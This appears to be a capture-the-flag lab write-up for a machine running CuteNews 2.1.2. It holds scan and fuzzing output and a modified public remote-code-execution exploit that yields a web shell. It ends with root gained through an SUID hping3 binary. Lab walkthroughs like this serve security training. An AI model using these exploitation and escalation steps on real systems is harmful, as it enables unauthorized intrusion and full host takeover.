## MACHINE IP
```bash
192.168.161.128
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Tue Nov  4 13:36:50 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 192.168.161.128
Nmap scan report for 192.168.161.128
Host is up (0.23s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
|_  256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 (Debian)
|_http-favicon: Unknown favicon MD5: 759585A56089DB516D1FBBBE5A8EEA57
|_http-title: Apache2 Debian Default Page: It works
88/tcp  open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 404 Not Found
110/tcp open  pop3     Courier pop3d
|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) TOP UTF8(USER) UIDL PIPELINING LOGIN-DELAY(10) STLS USER
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2:40c8:66d1:b327:71e6:085a:f50b:7e28
|_SHA-1: 28a3:acc0:86a7:cd64:8f09:78fa:1792:7032:0ecc:b154
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Courier pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-17T16:28:06
| Not valid after:  2021-09-17T16:28:06
| MD5:   5ee2:40c8:66d1:b327:71e6:085a:f50b:7e28
|_SHA-1: 28a3:acc0:86a7:cd64:8f09:78fa:1792:7032:0ecc:b154
|_pop3-capabilities: TOP IMPLEMENTATION(Courier Mail Server) UTF8(USER) UIDL PIPELINING LOGIN-DELAY(10) USER
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  4 13:37:58 2025 -- 1 IP address (1 host up) scanned in 67.39 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
88/tcp  open  http     nginx 1.14.2
110/tcp open  pop3     Courier pop3d
995/tcp open  ssl/pop3 Courier pop3d
```
## RECON
```bash
# Operating System               //Found Post Initial Foothold
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
```
## ENUMERATION
```bash
# port 80
sudo ffuf -r -c -w /usr/share/wordlists/dirb/common.txt -fc 404 -u $url/FUZZ | tee fuzz/ffuf-common
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 227ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3033ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3033ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4037ms]
core                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 243ms]
docs                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 225ms]
favicon.ico             [Status: 200, Size: 1150, Words: 8, Lines: 1, Duration: 225ms]
index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 226ms]
index.php               [Status: 200, Size: 6175, Words: 1179, Lines: 169, Duration: 269ms]
libs                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 225ms]
manual                  [Status: 200, Size: 626, Words: 14, Lines: 13, Duration: 228ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 224ms]
skins                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 226ms]
uploads                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 226ms]   

- Found index.php as index.html leads to default apache page
- index.php - shows CuteNews 2.1.2
  
searchsploit cutenews 2.1.2
CuteNews 2.1.2 - Remote Code Execution | php/webapps/48800.py            

python3 48800.py
[->] Usage python3 expoit.py

Enter the URL> http://192.168.161.128/                   
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
[-] No hashes were found skipping!!!
================================================================

=============================
Registering a users
=============================

- Failed !!!
  
- Checking the Exploit 48800.py code
- Seems like it works on the /CuteNews/index.php but our site is doesnot have a path or folder /CuteNews instead it /index.php points to the application
- remove /CuteNews in the exploit code
- Run the exploit
```
## INITIAL SHELL
```bash
Enter the URL> http://192.168.161.128                                                                                                                                                        
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================                              
[-] No hashes were found skipping!!!                                                          
================================================================
=============================                                                                 
Registering a users                                                                           
=============================                                                                 
[+] Registration successful with username: 7oM5WrTLmW and password: 7oM5WrTLmW                
=======================================================                                       
Sending Payload                                                                               
=======================================================
signature_key: 7f5392bb5f6b8aaca2c5edbec11f7de4-7oM5WrTLmW                                    
signature_dsi: dec84d496c727a8374cdd76c40a50add                                               
logged in user: 7oM5WrTLmW                                                                    
============================
Dropping to a SHELL
============================                                                                  
command > id                                                                                  
uid=33(www-data) gid=33(www-data) groups=33(www-data)         
```
## PRIVILEGE ESCALATION
```bash
# SUID
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/hping3
```
## ROOT | ADMINISTRATOR - PWNED
```bash
www-data@cute.calipendula:/var/www/html/uploads$ /usr/sbin/hping3
hping3> /bin/sh -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# whoami
root
```
